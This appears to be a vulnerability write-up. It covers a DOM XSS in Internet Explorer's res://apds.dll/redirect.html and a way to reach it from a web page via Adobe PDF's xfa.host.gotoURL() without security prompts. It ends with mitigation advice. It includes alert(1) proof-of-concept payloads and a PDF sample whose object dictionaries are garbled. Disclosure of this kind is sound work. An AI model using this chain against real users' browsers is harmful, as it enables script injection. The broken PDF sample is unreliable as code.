### 1. `res://apds.dll/redirect.html` DOM XSS Vulnerability

A DOM-based Cross-Site Scripting (XSS) vulnerability in `res://apds.dll/redirect.html` was reported on [Google Project Zero](https://bugs.chromium.org/p/project-zero/issues/detail?id=1598&desc=5). This issue remains unfixed as of the date of this report.

The vulnerability is a classic example of a DOM XSS, where malicious input can be injected into the `target` parameter of the `res://apds.dll/redirect.html` URL. The following Proof of Concept (PoC) demonstrates the exploit:

```html
res://apds.dll/redirect.html?target=javascript:alert(1)
```

### 2. From `http://` Domain to `res://` Domain

Typically, accessing `res://` resources from an `http://` domain is restricted for security reasons. However, the `xfa.host.gotoURL()` JavaScript function in Adobe PDF can navigate to multiple types of URLs, including `http(s)://` and `file://`. While opening PDF files, users are generally prompted with security warnings.

When using `xfa.host.gotoURL()` in conjunction with Internet Explorer (IE) and Adobe's PDF ActiveX plugin, it is possible to bypass these restrictions and access `res://` or `http(s)://` URLs without triggering any security alerts. For example:

```javascript
xfa.host.gotoURL("res://apds.dll/redirect.html?target=javascript:alert(1);//");
```

This allows the execution of the XSS payload `alert(1)`.

#### PoC:
- **URL:** `http://xxxxxxx/r.pdf`
- **r.pdf Content:**

```pdf
%PDF-1.4
1 0 obj
>
%endobj
2 0 obj >
stream
    1
endstream
endobj
trailer
>
  /AcroForm
  >
  /OpenAction
      >
  >>
>>
```

### 3. Mitigation and Recommendations

Due to the security domain isolation in Internet Explorer, the impact of the `res://` domain XSS is somewhat limited. Nevertheless, Microsoft should address the `res://apds.dll/redirect.html` XSS vulnerability proactively. Additionally, Adobe should either disable the ability to redirect to `res://` URLs or provide appropriate security warnings when such redirections occur. These measures would enhance the overall security and user experience.
